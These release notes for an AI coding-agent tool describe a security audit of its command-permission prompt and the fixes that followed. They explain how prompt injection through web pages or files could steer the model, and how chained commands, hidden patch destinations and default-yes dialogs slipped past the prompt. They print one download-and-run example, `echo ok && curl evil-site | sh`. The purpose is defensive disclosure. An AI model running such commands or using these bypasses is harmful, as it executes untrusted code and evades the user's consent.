# Gorilla Opencode v0.1.97 — the permission prompt tells the truth

Released 18 August 2026. Replaces v0.1.96.

Two tracks below, both complete. Neither is a summary of the other.

---

## Plain-language track

### How this release started, and what it turned into

It began as a small complaint: a notice in the status bar was cut off halfway, so
the half that told you what to do was the half you never saw.

Fixing that led to looking at a different bug, which led to noticing that the
program's safety check for running commands only read the **first word** of a
command. That prompted a full security audit. This release is the result.

**Nothing here is a new feature.** It is a release about the program being honest
with you.

### The part that matters most

This program can run commands, write files and edit your code. It decides what to
do by asking an AI model — and an AI model can be talked into things. It reads web
pages. It reads files you didn't write. If any of those carry instructions aimed
at the model rather than at you, the model may follow them.

The protection against that is simple: **before doing anything that could change
or damage something, the program asks you.**

That question is the only real protection this program has. And the audit found
that in several places, **the question was describing something other than what
was about to happen.**

That is worse than having no question at all. A missing lock makes you careful. A
lock fitted to the wrong door makes you relax.

### What the question was getting wrong

**It read only the first word of a command.** The computer runs the whole line.
So `echo ok && curl evil-site | sh` looked like the harmless `echo`, was never
questioned, and then downloaded and ran a stranger's script. The same trick
worked with `;`, with `|`, and with `$( )`, which tucks a whole hidden command
inside another.

**Its list of "harmless" commands wasn't.** It included commands whose entire job
is to run *another* command — so naming them harmless effectively named
everything harmless. It also included commands that stop programs and delete
things. And one that prints every password the program holds.

**It named the wrong file.** A patch can say "move this file to there". The
destination was never checked and never shown. The program could ask *"Update
README.md?"* and, when you agreed, write into your shell startup file and delete
the README instead. Same with shortcuts: you were shown the shortcut, the bytes
went where it pointed.

**"Allow for this session" granted far more than it said.** You were shown one
command and a button. Pressing it approved *every* command of that type for the
rest of the session — including ones you never saw.

**It defaulted to yes.** The dialog opened with "Allow" already selected, and kept
your last answer for the next, different question. A stray Enter approved
something you never read.

**The no-menus mode showed you nothing.** File rewrites were approved without you
ever seeing what would change — in the mode this project steers older machines
toward.

**A failed tool reported success.** If something went wrong, the assistant was
handed an empty result marked "fine", and carried on believing the work was done.

### What was fixed

All of it. The question now reads the whole command, names the real destination,
remembers what you actually approved, defaults to *no*, resets for each new
question, shows you the change even without menus, and tells the assistant when
something failed.

Credential files outside your project — SSH keys, cloud logins, this program's
own settings — are now refused outright. Files inside your project are untouched:
a test file called `key.pem` in your own code reads normally, because you chose
to work there.

### The honest part: is there a backdoor?

You asked directly, so here is the direct answer: **no.**

Not "we didn't find one". The audit went looking properly. The outside code this
program depends on is **identical to the original project's** — nothing added,
nothing swapped for a lookalike. Every web address written into the code was
found and classified: 738 of them, of which 80 reach the shipped program, and all
80 are either an AI service you chose or a documentation link. The two pieces of
code every request passes through were read line by line. Checks for hidden text,
disguised addresses, invisible characters, startup code and build-time tricks all
came back clean. There is no tracking and nothing phones home.

What was inherited from the original project isn't malice. It's an **unfinished
permission system** — written quickly in early 2025, never revisited, and adopted
wholesale when this project forked from it.

### It can still do its job

A security fix that breaks the tool is a worse bug than the one it fixed. This is
a coding assistant; it has to write files, edit them, apply patches and run
builds. That was tested for real, after every change:

| what it was asked to do | result |
|---|---|
| Create a new source file | worked |
| Edit an existing file | worked — the program then compiled and printed the right answer |
| Apply a patch | worked |
| Move a file into a subfolder | worked |
| Run a build | worked |
| Search the code | worked |
| Read an ordinary project file | worked — not refused |

**Being asked is not being blocked.** Everything you could do before, you can
still do. Some things now show a prompt first: one keypress for you, and the
whole attack for an attacker.

### One thing we deliberately did NOT do

`go build` and `go test` still run without asking, even though both can execute
code from your project. An assistant runs them constantly and prompting every
time would make the tool exhausting.

We are telling you rather than hiding it. For that to hurt you, someone would
first have to get malicious code *into* your project — and writing files is
something the program does ask about.

### Also fixed, from where this started

The status-bar notice that was cut in half now also prints in full into the
conversation, where there's room for it. Notices no longer wipe each other out
early — they were cutting each other short, which is why they seemed to vanish
faster than they should.

And when a model writes a tool call as plain text instead of making one properly
— which some models do, and which the service is supposed to clean up — you now
get told what happened, instead of a wall of raw JSON presented as the answer.

## Developer track

### Scope

Fifteen commits. One TUI change, seven security fixes, one correction to one of
those fixes, one correctness fix, one model-compatibility fix, and the audit
documentation.

### Audit method and result

Seven parallel hunt lanes (shell execution, permission model, file tools,
credentials, network/SSRF, deliberate-backdoor sweep, prompt-injection surface),
each required to establish provenance per finding with `git log -S` / `git blame`.
Every claim then went to an independent adversarial verifier whose default was
**reject**.

**52 claims → 19 confirmed, 33 rejected**, several severities corrected downward.
One "finding" was a re-derivation of a caveat written in `docs/SHELL-SAFETY.md`
hours earlier. Full record in `docs/SECURITY-AUDIT-2026-08-18.md`.

Backdoor sweep negative with evidence: `go.mod` diffed against upstream `be5db3a`
shows **zero modules added or removed**; 738 URL literals inventoried (80 in the
binary); both custom `RoundTripper`s read line by line; three base64 decodes, all
JWT/Gemini parses; bidi and zero-width scan clean; all 26 `init()` reviewed; 13
`//go:embed` verified; `.goreleaser.yml` hooks empty; no `//go:generate`; no
telemetry.

### The defects, and their provenance

Every one predates this fork. `git log -S` puts `isSafeReadOnly` at `904061c`
(2025-03-25) and `safeReadOnlyCommands` at `9492394` (2025-04-08), both Kujtim
Hoxha, upstream OpenCode. No `GORILLA OVERRIDE` annotation, nothing in `LESSONS/`,
the project Chroma store, `Changelogs/`, `ReleaseNotes/`, `CLAUDE.md` or the brain
— in a codebase that annotates every deliberate divergence, that absence is
evidence nobody decided it.

### The correction, recorded rather than hidden

`d22f075` made the patch tool **refuse** move destinations outside the working
directory. That contradicts `internal/config/roots.go:12` — *"There is no sandbox
in this codebase — tools accept absolute paths anywhere"* — and would have broken
work across `/add-dir` roots. `2727690` replaced the refusal with
`ResolveWriteTarget`/`DescribeWriteTarget`, which resolve symlinks and the nearest
existing ancestor, consult `config.RootFor`, and render the true destination.

The defect was consent integrity all along, not containment. The audit's own
verifier reached that conclusion independently.

### The leaked tool call

Llama 3.x tool calling is a text protocol; the serving layer is expected to lift
`<|python_tag|>{…}` out of the stream. Stacks detokenising with
`skip_special_tokens=True` destroy the frame first, so bare JSON arrives as
content.

Measured by replaying the session database: **4 of 13** `llama-3.3-70b-instruct`
turns (31%) were a leaked call as whole content — and **every one was invalid
JSON** (`"parameters": "query": …`, inner brace missing). A detector requiring
`json.Unmarshal` to succeed matches none of them, which is what both initial
designs did. The detector is therefore structural. It labels and never dispatches:
synthesising a call from model text is the fuzzy-output-to-dispatch path
`toolname.go` forbids, and a malformed payload would have to be repaired first.

### Capability regression testing

Non-negotiable. Re-run end to end after the final fix, against a fresh project,
model `deepseek-v4-flash-0731`: write → edit (built binary run, printed `5`) →
patch → bash build → find → view. All six passed; `view` read an ordinary project
file without refusal.

Permanent guards: `TestOrdinaryProjectFilesAreStillReadable`,
`TestLegitimateInWorkspaceDestinationsStayInside`,
`TestOrdinaryPathsAreDescribedPlainly`, `TestLookalikeDirectoryNamesAreNotCaught`,
`TestAKeylessGrantStillCoversTheTool`.

### Declared residual risk

`go build` and `go test` remain unprompted; both execute code from the tree. Kept
because an agent runs them constantly. Mitigating argument: introducing that code
requires the write tool, which prompts.

`internal/llm/tools/sensitive.go` is a **blocklist, not a boundary**, and says so
in its header. It does not overturn the no-sandbox decision.
